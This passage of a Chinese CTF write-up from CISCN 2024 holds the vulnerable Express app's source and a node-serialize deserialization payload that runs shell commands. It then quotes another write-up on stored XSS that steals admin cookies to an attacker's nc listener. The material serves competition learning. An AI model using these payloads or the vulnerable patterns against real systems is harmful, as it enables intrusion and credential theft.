class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"art-template"</span><span class="token operator">:</span> <span class="token string">"^4.13.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"chrome"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-art-template"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-jwt"</span><span class="token operator">:</span> <span class="token string">"^5.3.0"</span><span class="token punctuation">,</span>    <span class="token property">"jsonwebtoken"</span><span class="token operator">:</span> <span class="token string">"^7.4.3"</span><span class="token punctuation">,</span>    <span class="token property">"node-schedule"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"node-serialize"</span><span class="token operator">:</span> <span class="token string">"0.0.4"</span><span class="token punctuation">,</span>    <span class="token property">"serialize"</span><span class="token operator">:</span> <span class="token string">"^0.1.3"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"^0.11.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码，发现可以直接在&#x2F;login路由传cookie参数profile打serialize依赖的反序列化</p><p>直接打payload，因为不回显，所以尝试写文件带外</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"function"</span><span class="token operator">:</span><span class="token string">"_$$ND_FUNC$$_function()&#123;\r\n\t\trequire('child_process').exec('ls />/tmp/1.txt', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623125255162.png" alt="image-20240623125255162"></p><p>然后去前面任意文件读取那边读取&#x2F;tmp&#x2F;1.txt即可</p><h2 id="FIX（Failed）"><a href="#FIX（Failed）" class="headerlink" title="FIX（Failed）"></a>FIX（Failed）</h2><p>有好几个洞，猜测是差一个xss的洞，一直不会修</p><p>据说xss是22年的黑盾杯的方法：<a href="https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg">https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg</a></p><p>复现xss参考：<a href="https://blog.mo60.cn/index.php/archives/487.html">https://blog.mo60.cn/index.php/archives/487.html</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 定时清除</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#获取的数据信息\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//主页</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bd<span class="token operator">=</span><span class="token function">str</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|http|\"|\`|cookie|&lt;|>|script</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后台管理</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>qweqwe<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>qweqwe<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>data_path <span class="token operator">=</span> qweqwe<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//已弃用的登录</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(funcion|require|exec|child_process)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="黑盾xss"><a href="#黑盾xss" class="headerlink" title="黑盾xss"></a>黑盾xss</h2><p>福建省第三届“闽盾杯”网络空间安全大赛（黑盾赛道）刚刚结束，相信很多参赛选手对决赛中那个复古式留言本一定是印象深刻的，可谓简洁到极致，却又困惑到极点。（黑客的成长之路定是不断地打破困惑！）</p><p>今天我就来分享一下渗透这个web系统的writeup。</p><p>看它那长相，不用怀疑，真的是本人16年前还在读书的时候做的一个留言本。当然，为了出题，还是改动了一丢丢的。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/640" alt="图片"></p><p><strong>渗透过程</strong></p><p><strong>一、目录扫描</strong></p><p>使用御剑、wwwscan之类的工具扫描，或者人工猜测，可以发现后台路径&#x2F;admin&#x2F;。查看网页源代码也能发现注释掉的后台链接：</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/641" alt="图片"></p><p>这里也有一定的机会发现默认的access数据库文件&#x2F;ly.mdb（主要取决于字典库是否够丰富，以及你的运气是否够好）。这里不发现数据库也无所谓，后面的步骤也能获取数据库。打开数据库可得一个flag。</p><p>尝试访问后台&#x2F;admin&#x2F;会提示只允许localhost本机访问，这时有些人会尝试修改HTTP头的host或XFF字段去访问，思维有没问题，不过这一题的考点恰好不在这方面。</p><p><strong>二、表单测试发现跨站脚本漏洞</strong></p><p>在留言表单的标题或内容中填写一些payload尝试命令执行、代码执行、跨站脚本等漏洞。提交后再去查看留言可以发现js脚本会执行，说明有存储型跨站脚本漏洞。</p><p><strong>三、跨站脚本XSS窃取管理员cookies</strong></p><p>根据经验，跨站脚本可以用来窃取他人的cookies并发送到事先准备好的接收平台上。这里提供两种接收思路：</p><h3 id="思路一：搭一个平台接收cookies"><a href="#思路一：搭一个平台接收cookies" class="headerlink" title="思路一：搭一个平台接收cookies"></a><strong>思路一：搭一个平台接收cookies</strong></h3><p>攻击者在自己电脑上搭一个web服务，用来接收、保存数据。可以用网上开源的一些工具来搭建环境，比如：BlueLotus_XSSReceiver。代码基础比较好的话，也可以自己写一个程序来接收。</p><p>但我有更简单的方案，就是用nc，这个小工具大家更熟悉，只要用一条命令监听端口就可以收数据了：nc.exe -v -L -p 543</p><p><img 